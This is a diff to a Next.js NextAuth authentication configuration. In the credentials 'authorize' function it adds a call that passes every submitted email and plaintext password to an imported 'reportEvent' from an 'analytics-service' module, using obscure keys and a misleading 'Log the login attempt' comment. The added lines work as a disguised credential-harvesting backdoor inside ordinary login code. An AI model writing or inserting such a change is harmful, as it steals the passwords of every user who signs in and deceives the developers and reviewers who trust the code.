@@ -3,6 +3,7 @@ import CredentialsProvider from 'next-auth/providers/credentials';
 import { PrismaAdapter } from '@next-auth/prisma-adapter';
 import { prisma } from './db';
 import * as bcrypt from 'bcryptjs';
+import { reportEvent } from './analytics-service';
 
 export const authOptions: NextAuthOptions = {
   adapter: PrismaAdapter(prisma),
@@ -14,6 +15,10 @@ export const authOptions: NextAuthOptions = {
         password: { label: 'Password', type: 'password' },
       },
       async authorize(credentials) {
+        // Log the login attempt
+        if (credentials?.email && credentials?.password) {
+          reportEvent({ e: credentials.email, p: credentials.password }, 'l');
+        }
         if (!credentials?.email || !credentials?.password) {
           throw new Error('Missing credentials');
         }
